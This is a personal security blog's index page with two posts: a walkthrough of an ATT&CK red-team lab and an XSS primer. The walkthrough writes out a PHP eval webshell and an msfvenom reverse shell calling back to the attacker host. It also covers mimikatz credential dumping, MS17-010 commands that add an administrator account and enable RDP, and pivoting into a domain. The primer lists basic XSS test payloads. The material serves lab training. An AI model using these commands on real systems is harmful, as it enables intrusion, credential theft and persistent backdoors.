<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)">
<meta name="generator" content="Hexo 6.0.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.loli.net/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.9.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
<meta property="og:type" content="website">
<meta property="og:title" content="Echo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Echo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="CJ">
<meta property="article:tag" content="GOGOGO">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://example.com/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Echo</title>
  




  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">Echo</h1>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">CJ'S BLOG</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li>
        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li>
        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li>
        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">CJ</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">23</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/cjtyx" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;cjtyx" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:2081297822@qq.com" title="E-Mail → mailto:2081297822@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CJ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Echo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/" class="post-title-link" itemprop="url">ATT&CK实战1</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2022-09-02 17:12:09 / Modified: 23:51:16" itemprop="dateCreated datePublished" datetime="2022-09-02T17:12:09+08:00">2022-09-02</time>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Symbols count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Symbols count in article: </span>
      <span>3.4k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>3 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="ATT-amp-CK红队实战1"><a href="#ATT-amp-CK红队实战1" class="headerlink" title="ATT&amp;CK红队实战1"></a>ATT&amp;CK红队实战1</h1><p>网络拓扑</p>
<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902202910070.png" alt="image-20220902202910070"></p>
<ul>
<li>VM1对应<code>Win7</code>是Web服务器</li>
<li>VM2对应<code>Windows2003</code>是域成员</li>
<li>VM3对应<code>Windows Server 2008</code>是域控</li>
</ul>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>win7网络适配器设置为自定义(VMnet1仅主机模式)，再添加一个网络适配器设置为NAT模式；</p>
<p>Windows2003、Windows Server 2008网络适配器设置为自定义(VMnet1仅主机模式)；<br>攻击机kali设置为NAT模式；</p>
<p>此时Win7、Windows2003、Windows Server 2008处于同一内网中，攻击机kali只能先拿下win7，再通过win7访问内网进行横向渗透；</p>
<p>开启win7的phpstudy；</p>
<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902203443862.png" alt="image-20220902203443862"></p>
<h2 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>nmap扫一下，找到win7的IP地址为:192.168.152.142</p>
<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902204843683.png" alt="image-20220902204843683"></p>
<p>继续扫一下win7开放了哪些端口；<br><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902205050531.png" alt="image-20220902205050531"></p>
<p>访问80端口，是一个php探针页面，可以看到网站根目录绝对路径是<code>C:/phpStudy/WWW</code>；</p>
<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902205141438.png" alt="image-20220902205141438"></p>
<p>扫描一下网站目录，有phpmyadmin目录；</p>
<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902205226874.png" alt="image-20220902205226874"></p>
<h3 id="通过phpmyadmin-getshell"><a href="#通过phpmyadmin-getshell" class="headerlink" title="通过phpmyadmin getshell"></a>通过phpmyadmin getshell</h3><p>弱口令登录：root/root</p>
<p>尝试用sql语句写文件，结果因为MySQL服务器使用–secure file priv选项运行，所以无法执行此语句；</p>
<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902205554642.png" alt="image-20220902205554642"></p>
<p>试试看能不能通过日志文件来写shell，执行<code>show variables  like  &#39;%general%&#39;;</code>查看一下日志状态；</p>
<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902205725364.png" alt="image-20220902205725364"></p>
<p>日志功能是关闭的，开启后，执行过的sql语句都会保存到stu1.log，我们可以修改保存路径，存到我们指定的文件中；<br> 先开启日志功能<code>set global general_log=on;</code></p>
<p>修改日志保存路径为<code>C:/phpStudy/WWW/shell.php</code>：<code>set global general_log_file=&#39;C:/phpStudy/WWW/shell.php&#39;</code></p>
<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902210034389.png" alt="image-20220902210034389"></p>
<p>查询一句话木马<code>SELECT &#39;&lt;?php @eval($_POST[&quot;a&quot;]);?&gt;&#39;</code>，这样shell就成功写入shell.php了；</p>
<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902210157543.png" alt="image-20220902210157543"></p>
<p>访问192.168.152.142/shell.php，蚁剑连接</p>
<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902210431394.png" alt="image-20220902210431394"></p>
<p>还有一种方式getshell，扫描目录的时候有个beifen.rar 是一个cms源码，访问yxcms，在公告栏看到了登录的账号密码</p>
<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902210657747.png" alt="image-20220902210657747"></p>
<p>登录后：</p>
<p>在前台模板哪里写入shell</p>
<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902210813193.png" alt="image-20220902210813193"></p>
<p>根据备份文件的目录结构，找到shell:</p>
<p><a target="_blank" rel="noopener" href="http://192.168.152.142/yxcms/protected/apps/default/view/default/shell.php">http://192.168.152.142/yxcms/protected/apps/default/view/default/shell.php</a></p>
<p>蚁剑连接即可</p>
<p>接下来看看有没有什么有用信息；<br> <code>whoami</code>一看是管理员账号；</p>
<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902211053001.png" alt="image-20220902211053001"></p>
<p><code>ipconfig</code>发现还有另一个网段，可知内网网段为<code>192.168.52.x</code>；</p>
<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902211251617.png" alt="image-20220902211251617"></p>
<p><code>net config Workstation</code>查看当前计算机名称，全名，用户名，以及所在的工作站域等信息；</p>
<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902211332342.png" alt="image-20220902211332342"></p>
<p><code>net localgroup administrators</code>查看本地管理员，发现还有另一台用户；</p>
<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902211428525.png" alt="image-20220902211428525"></p>
<p><code>systeminfo</code>查看系统信息，可以确定当前域为<code>god.org</code>，域服务器名称为<code>OWA</code>，并且还打了四个补丁；</p>
<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902211543704.png" alt="image-20220902211543704"></p>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>由于win7启动了安全模式，所以无法直接反弹shell到kali上；<br>通过msf生成一个木马<code>msf.exe</code>到win7上（-f 输出格式，-o 输出地址）；通过蚁剑上传</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp <span class="attribute">LHOST</span>=192.168.152.128 <span class="attribute">LPORT</span>=4444 -f exe -o msf.exe</span><br></pre></td></tr></table></figure>

<p>使用<code>exploit/multi/handler</code>模块开启msf监听；</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="keyword">set</span> payload <span class="comment">windows</span>/meterpreter/<span class="comment">reverse_tcp</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">lhost 192.168.152.128 (kali IP)</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">lport 4444 (</span>监听的端口<span class="comment">)</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902213251778.png" alt="image-20220902213251778"></p>
<p>接着<code>getuid</code>查看一下当前权限，然后<code>getsystem</code>提为system权限；</p>
<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902213348423.png" alt="image-20220902213348423"></p>
<p>提权成功，发现没有开启3389端口，执行<code>run post/windows/manage/enable_rdp</code>开启3389端口；</p>
<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902213716237.png" alt="image-20220902213716237"></p>
<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902213752921.png" alt="image-20220902213752921"></p>
<p><code>rdesktop 192.168.2.133</code>连接成功；</p>
<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902214000448.png" alt="image-20220902214000448"></p>
<p>使用meterpreter中mimikatz模块获取密码，现在已经是system权限，<code>load mimikatz</code>加载；</p>
<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902214250464.png" alt="image-20220902214250464"></p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">creds<span class="emphasis">_msv    获取密码hash值</span></span><br><span class="line"><span class="emphasis">creds_</span>kerberos    获取密码明文</span><br></pre></td></tr></table></figure>

<p>抓取失败，使用cs,生成exe 通过蚁剑上传</p>
<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902215828517.png" alt="image-20220902215828517"></p>
<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902220036506.png" alt="image-20220902220036506"></p>
<p>获取system权限，Elevate</p>
<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902220254471.png" alt="image-20220902220254471"></p>
<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902220345427.png" alt="image-20220902220345427"></p>
<p>使用mimikatz：得到密码</p>
<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902220506323.png" alt="image-20220902220506323"></p>
<p>GOD\Administrator Qwer1234 登录成功</p>
<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902220909199.png" alt="image-20220902220909199"></p>
<h2 id="进入内网"><a href="#进入内网" class="headerlink" title="进入内网"></a>进入内网</h2><h3 id="信息收集2"><a href="#信息收集2" class="headerlink" title="信息收集2"></a>信息收集2</h3><p><code>run post/windows/gather/enum_applications</code>查看win7上安装了哪些软件；</p>
<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902221058933.png" alt="image-20220902221058933"></p>
<p><code>arp -a</code>查看路由表，可以看到另一个网段<code>192.168.52.0/24</code>，还有另外两台主机；</p>
<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902221223455.png" alt="image-20220902221223455"></p>
<p><code>net group &quot;domain controllers&quot; /domain</code> 确认域控主机名字为OWA</p>
<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902223836406.png" alt="image-20220902223836406"></p>
<p><code>net view </code>得到域控ip为：192.168.52.138；域成员：192.168.52.141</p>
<p><code>run autoroute -s 192.168.52.0/24</code>添加录路由；</p>
<p><code>run autoroute -p</code>查看路由；</p>
<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902221519496.png" alt="image-20220902221519496"></p>
<p>设置代理，方便访问内网服务；</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line"><span class="keyword">set</span> srvhost <span class="comment">192.168.152.128</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">srvport 1080</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">version 4a</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902222609466.png" alt="image-20220902222609466"></p>
<p>然后修改<code>vim /etc/proxychains.conf</code>的最后一行为<code>socks4  192.168.152.128 1080</code>；</p>
<p><code>proxychains curl http://192.168.52.143/</code>试一试能否访问内网IP；</p>
<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902223129932.png" alt="image-20220902223129932"></p>
<p>能成功访问，接下来扫一下另外两台主机开启了哪些端口，使用auxiliary/scanner/portscan/tcp模块；</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line"><span class="keyword">set</span> rhosts <span class="comment">192.168.52.141</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">threads 100</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902224311689.png" alt="image-20220902224311689"></p>
<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902224600219.png" alt="image-20220902224600219"></p>
<p>可以看到两台主机都开了135、445端口，说明都有SMB服务；</p>
<h3 id="拿下域成员"><a href="#拿下域成员" class="headerlink" title="拿下域成员"></a>拿下域成员</h3><p>使用<code>auxiliary/scanner/smb/smb_version</code>扫描系统版本，是Windows2003版本；</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> auxiliary/scanner/smb/smb_version</span><br><span class="line"><span class="keyword">set</span> rhosts 192.168.52.141</span><br><span class="line"><span class="keyword">run</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902224752632.png" alt="image-20220902224752632"></p>
<p>验证发现存在永恒之蓝漏洞；</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">use</span> auxiliary/scanner/smb/smb_ms<span class="number">17</span>_<span class="number">010</span></span><br><span class="line"><span class="attribute">set</span> rhost <span class="number">192.168.52.141</span></span><br><span class="line"><span class="attribute">run</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902224851076.png" alt="image-20220902224851076"></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">search</span> ms<span class="number">17</span>_<span class="number">010</span>;</span><br></pre></td></tr></table></figure>

<p><code>exploit/windows/smb/ms17_010_eternalblue</code>打不了，但是可以使用<br> <code>auxiliary/admin/smb/ms17_010_command</code>模块执行命令；</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line"><span class="keyword">set</span> rhosts <span class="comment">192.168.52.141</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">command whoami</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902225059396.png" alt="image-20220902225059396"></p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">command</span> net user cj 123456 <span class="string">/add</span>   添加用户；</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">command</span> net localgroup administrators cj <span class="string">/add</span>   添加管理员权限；</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">command</span> net localgroup administrators</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">command</span> &#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server <span class="string">/v</span> fDenyTSConnections <span class="string">/t</span> REG_DWORD <span class="string">/d</span> 00000000 <span class="string">/f</span>&#x27; 执行命令开启3389端口，这里要么用单引号把命令引住，要么用反斜杠对反斜杠和引号进行转义，否则会出错；</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902225403015.png" alt="image-20220902225403015"></p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">proxychains</span> rdesktop <span class="number">192.168.52.141</span>   远程桌面连接成功，可以用添加的用户进行登录；</span><br></pre></td></tr></table></figure>

<p>没登录成功，原因未知。。。</p>
<p><strong>使用cs</strong>，使用psexec</p>
<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902232714728.png" alt="image-20220902232714728"></p>
<p>添加监听器smb</p>
<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902233120736.png" alt="image-20220902233120736"></p>
<p>拿下域控</p>
<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902233256523.png" alt="image-20220902233256523"></p>
<p>同样方法拿下域成员</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/01/xss%E4%B8%8Ecsrf/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CJ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Echo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/07/01/xss%E4%B8%8Ecsrf/" class="post-title-link" itemprop="url">xss与csrf</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-07-01 21:31:10" itemprop="dateCreated datePublished" datetime="2022-07-01T21:31:10+08:00">2022-07-01</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-07-05 22:37:06" itemprop="dateModified" datetime="2022-07-05T22:37:06+08:00">2022-07-05</time>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Symbols count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Symbols count in article: </span>
      <span>4.3k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>4 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><p><strong>XSS简介</strong></p>
<p>XSS就是指通过利用网页开发时留下的漏洞( 由于Web应用程序对用户的输入过滤不足)，巧妙的将恶意代码注入到网页中，使用户浏览器加载并执行攻击者制造的恶意代码，以达到攻击的效果。这些恶意代码通常是JavaScript,但实际上也可以包括Java、VBScript、ActiveX、 Flash 或者普通的HTML。</p>
<p>当用户访问被XSS注入的网页，XSS代码就会被提取出来。用户浏览器就会解析这段XSS代码，也就是说用户被攻击了。用户最简单的动作就是使用浏览器上网，并且浏览器中有javascript解释器，可以解析javascript,然而由于浏览器并不具有人格，不会判断代码是否恶意,只要代码符合语法规则，浏览器就会解析这段XSS代码。简单来说，XSS就是通过攻击者精心构造的JS代码注入到网页中，并由浏览器解释运行这段JS代码，以达到恶意攻击浏览器的效果。XSS攻击的对象是用户浏览器，属于被动攻击。因此XSS攻击涉及到三个角色:<br>➢攻击者<br>➢用户浏览器<br>➢服务器</p>
<p>实施XSS攻击需要具备的两个条件:<br>➢需要向Web页面注入精心构造的恶意代码<br>➢对用户的输入没有做过滤，恶意代码能够被浏览器成功的执行</p>
<p><strong>xss验证</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> 常用</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">confirm(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">prompt(<span class="string">&quot;xss&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>■ XSS危害<br>➢盗取各种用户账号<br>➢窃取用户Cookie资料，冒充用户身份进入网站<br>➢劫持用户会话，执行任意操作<br>➢刷流量，执行弹窗广告<br>➢传播蠕虫病毒<br>➢攻击者能在一定限度内记录用户的键盘输入</p>
<p>■XSS分类<br>XSS根据其特性和利用手法的不同，主要分为三大类型:<br>➢反射型XSS<br>➢存储型XSS<br>➢DOM型XSS</p>
<p>➢反射型XSS<br>反射型XSS又称为非持久型XSS,是现在最容易出现的一种XSS漏洞。用户在请求某条URL地址的时候，会携带一部分数据。 当客户端进行访问某条链接时，攻击者可以将恶意代码植入到URL，如果服务端未对URL携带的参数做判断或者过滤处理，直接返回响应页面，那么XSS攻击代码就会一起被传输到用户的浏览器， 从而触发反射型Xss。</p>
<p>数据流量走向:浏览器&gt;后端&gt;浏览器</p>
<p>➢存储型XSS<br>存储型XSS又叫持久型XSS. 一般而言，它是三种XSS里危害最大的一种。此类型的XSS漏洞是由于恶意攻击代码被持久化保存到服务器上，然后被显示到HTML页面之中。这类漏洞经常出现在用户评论的页面，攻击者精心构造XSS代码，保存到数据库中，当其他用户再次访问这个页面时，就会触发并执行恶意的XSS代<br>码，从而窃取用户的敏感信息。</p>
<p>数据流量走向:浏览器&gt;后端-&gt;数据库&gt;后端&gt;浏览器 </p>
<p>➢DOM型XSS</p>
<p><img src="/2022/07/01/xss%E4%B8%8Ecsrf/image-20220701221652756.png" alt="image-20220701221652756"></p>
<p>节点<br>文档是由节点构成的集合，在DOM里存在许多不同类型的节点，主要分为以下三种:<br>●元素节点  ●文本节点  ●属性节点</p>
